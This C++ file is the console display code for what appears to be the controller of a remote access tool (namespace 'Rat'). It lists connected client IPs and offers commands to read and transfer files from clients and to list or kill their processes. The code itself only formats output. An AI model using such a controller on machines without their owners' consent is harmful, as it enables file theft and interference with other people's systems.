#include "ServerGUI.hpp"

namespace Rat 
{
    // Initialize static members
    std::map<uint64_t, ServerGUI::ProgressInfo> ServerGUI::progress_map_;
    std::mutex ServerGUI::console_mutex_;
    bool header_displayed_ = false;
    ServerGUI::ServerGUI() {}

    ServerGUI::~ServerGUI() {}

    void ServerGUI::displayClients(const std::unordered_map<std::shared_ptr<SslSocket>, uint64_t>& clients)
    {
        std::lock_guard<std::mutex> lock(console_mutex_);
        std::cout << BOLD << BLUE << "+------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << BLUE << "|          Connected Clients               |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n";
        std::cout << BOLD << "| IP Address       | Client ID             |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n";

        for (const auto& client : clients) {
            std::string ip = client.first->lowest_layer().remote_endpoint().address().to_string();
            std::cout << "| " << std::left << std::setw(16) << ip
                      << "| " << std::setw(21) << client.second << "|\n";
        }

        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n\n";
    }
    
    void ServerGUI::displayMenu() {
        std::lock_guard<std::mutex> lock(console_mutex_);
        std::cout << BOLD << YELLOW << "Available Commands:" << RESET << "\n";
        std::cout << GREEN << "  LIST_FILES <path>        : List files/folders in <path>" << RESET << "\n";
        std::cout << GREEN << "  READ_FILE <path>         : Read content of file at <path>" << RESET << "\n";
        std::cout << GREEN << "  TRANSFER_FILE <path>     : Transfer file from client" << RESET << "\n";
        std::cout << GREEN << "  LIST_PROCESSES           : List running processes" << RESET << "\n";
        std::cout << GREEN << "  KILL_PROCESS <pid>       : Kill process with <pid>" << RESET << "\n";
        std::cout << GREEN << "  EXIT                     : Stop server" << RESET << "\n";
        std::cout << BOLD << "Enter command: " << RESET;
    }

    void ServerGUI::displayResult(uint64_t client_id, const std::string& ip, const std::string& command, const std::string& result) {
        std::lock_guard<std::mutex> lock(console_mutex_);
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << BLUE << "| Response from Client ID: " << std::setw(10) << client_id << " IP: " << ip << " |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << "Command: " << RESET << command << "\n";
        std::cout << BOLD << "Result: " << RESET << "\n";
        std::cout << result << "\n";
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n\n";
    }

    void ServerGUI::displayError(const std::string& error) {
        std::lock_guard<std::mutex> lock(console_mutex_);
        std::cout << BOLD << RED << "Error: " << error << RESET << "\n\n";
    }

    void ServerGUI::displayProgress(uint64_t client_id, const std::string& ip, const std::string& filename,
                                   uint64_t sequence_number, uint64_t total_chunks) {
        std::lock_guard<std::mutex> lock(console_mutex_);

        // Update progress map
        progress_map_[client_id] = ProgressInfo{ip, filename, sequence_number, total_chunks};

        // In tiêu đề chỉ một lần khi progress_map_ bắt đầu có dữ liệu
        if (!header_displayed_ && !progress_map_.empty()) {
            std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
            std::cout << BOLD << BLUE << "| File Transfer Progress                                      |" << RESET << "\n";
            std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
            header_displayed_ = true;
        }

        // Xóa các dòng tiến trình cũ (không xóa tiêu đề)
        size_t lines_to_clear = progress_map_.size() * 2; // Mỗi client chiếm 2 dòng
        for (size_t i = 0; i < lines_to_clear; ++i) {
            std::cout << "\033[1A\033[K"; // Di chuyển lên và xóa dòng
        }

        // In tiến trình cho từng client
        for (std::map<uint64_t, ProgressInfo>::const_iterator it = progress_map_.begin(); it != progress_map_.end(); ++it) {
            uint64_t id = it->first;
            const ProgressInfo& info = it->second;
            float percentage = (info.sequence_number + 1) / (float)info.total_chunks * 100;
            int bar_width = 20;
            int filled = static_cast<int>(percentage / 100 * bar_width);
            std::string bar(filled, '=');
            bar.append(bar_width - filled, '-');

            std::cout << "| Client ID: " << std::setw(4) << id 
                      << " | IP: " << std::setw(20) << info.ip 
                      << " | File: " << std::setw(15) << info.filename << " |\n";
            std::cout << "| [" << bar << " " << std::fixed << std::setprecision(1) << percentage 
                      << "%] " << info.sequence_number + 1 << "/" << info.total_chunks 
                      << " chunks received |\n";
        }

        // Xóa mục đã hoàn tất
        std::vector<uint64_t> completed_clients;
        for (std::map<uint64_t, ProgressInfo>::const_iterator it = progress_map_.begin(); it != progress_map_.end(); ++it) {
            if (it->second.sequence_number + 1 >= it->second.total_chunks) {
                completed_clients.push_back(it->first);
            }
        }
        for (std::vector<uint64_t>::const_iterator it = completed_clients.begin(); it != completed_clients.end(); ++it) {
            progress_map_.erase(*it);
        }

        // Nếu progress_map_ rỗng, xóa tiêu đề
        if (progress_map_.empty() && header_displayed_) {
            std::cout << "\033[3A\033[K"; // Xóa tiêu đề (3 dòng)
            header_displayed_ = false;
        }

        std::cout.flush();
    }
}